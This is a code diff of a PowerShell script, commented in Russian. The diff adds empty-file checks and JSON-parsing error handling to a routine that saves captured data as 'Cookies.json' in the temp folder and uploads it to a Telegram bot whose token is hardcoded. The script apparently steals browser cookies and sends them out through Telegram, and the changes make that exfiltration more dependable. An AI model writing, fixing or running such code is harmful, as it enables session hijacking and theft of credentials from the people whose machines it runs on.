@@ -29,6 +29,11 @@ function Send-FileToTelegram {
     $url = "https://api.telegram.org/bot$BotToken/sendDocument"
     $fileContent = Get-Content -Path $FilePath -Raw
 
+    if ([string]::IsNullOrEmpty($fileContent)) {
+        Write-Error "File is empty. Cannot send an empty file to Telegram."
+        return
+    }
+
     try {
         $boundary = [System.Guid]::NewGuid().ToString()
         $headers = @{
@@ -121,11 +126,22 @@ if ($url_capture[0].Length -ge 2) {
 }
 
 # Извлекаем только JSON-часть из ответа
-$jsonResponse = $response | ConvertFrom-Json | Select-Object -ExpandProperty result
+try {
+    $jsonResponse = $response | ConvertFrom-Json | Select-Object -ExpandProperty result
+} catch {
+    Write-Error "Failed to parse JSON response: $_"
+    exit
+}
 
 # Сохраняем JSON в файл
 $tempFilePath = "$env:TEMP\Cookies.json"
 $jsonResponse | ConvertTo-Json -Depth 10 | Out-File -FilePath $tempFilePath -Encoding UTF8
+
+# Проверяем, что файл не пустой
+if ((Get-Item -Path $tempFilePath).Length -eq 0) {
+    Write-Error "The file is empty. Cannot send an empty file to Telegram."
+    exit
+}
 
 # Отправка файла в Telegram
 $botToken = "7677386741:AAFrg5fM7pBPcGeljsPI9BxyHAxXsBzoWl8"  # Замените на ваш токен бота
